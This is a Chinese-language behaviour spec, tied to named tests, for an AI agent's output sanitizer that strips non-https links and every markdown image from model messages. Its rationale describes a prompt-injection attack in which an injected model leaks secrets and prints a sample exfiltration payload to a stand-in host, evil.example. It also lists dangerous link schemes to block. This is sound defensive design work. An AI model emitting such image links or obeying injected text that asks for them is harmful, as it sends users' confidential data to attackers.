---
id: output-unsafe-links
tests: [TestStripUnsafeLinks, TestRunTurn, TestTurnIntermediateMessageStripsLinks]
behaviors: [output-unsafe-links]
---
# 送出的每則訊息只放行 https 連結，markdown 圖片一律拿掉

## 義務

- 模型回的每則訊息，在進對話紀錄與送出 `message` 事件之前，每個 text part 都過一次連結清理。包含：
  - 最終回答。
  - 帶工具呼叫的中間訊息。
  - `StopReason` 為 `error` 或 `aborted` 的半截回答。
  - 驗證器改寫後的最終回答。清理放在驗證器之後，驗證器加進去的連結也會被拿掉。
- 只有 `https://` 開頭的連結原樣保留，大小寫不拘（`HTTPS://` 也放行）。
- markdown 連結 `[文字](URL)` 的 URL 不是 `https://` 時，換成 `文字 [連結已移除]`，保留文字。
- 沒包成 markdown 的裸連結，協定不是 `https` 時，換成 `[連結已移除]`。涵蓋 `scheme://` 形式，以及 `javascript:`、`data:`、`vbscript:`、`file:`、`mailto:`、`http:`（關鍵字後面要接非空白字元）。
- markdown 圖片 `![文字](URL)` 一律拿掉，包含 `https`，換成 `文字 [圖片已移除]`。
- 一般文字如 `13:30`、`asOf:10-20` 不受影響。
- 只處理 text part。清理不會改動呼叫端傳入的訊息內容切片。
- `text_delta` 串流事件在輸出檢查之前就送出，不經過清理。畫面要以最後 `Final: true` 的 `message` 事件內容取代串流文字。
- 不做：不檢查 https 網址指向哪個網域；不檢查 thinking 與 toolCall 參數裡的連結。

## 原因

畫面如果自動載入圖片，圖片網址本身就能把資料帶出去：模型被注入後輸出 `![x](https://evil.example/?d=機密)`，使用者什麼都沒點，資料已經送走（OWASP LLM02）。所以圖片不論協定一律拿掉。`javascript:`、`data:` 這類協定則會在點擊時執行程式或載入內容，只留 https。

每則訊息都要過，是因為中間訊息與出錯的半截回答照樣會被畫面顯示，也會進對話紀錄，之後每一輪都會再送給模型。只清最終回答會留下漏洞。清理放在驗證器之後，是因為驗證器可能貼進複核回覆，那裡面也可能帶連結。
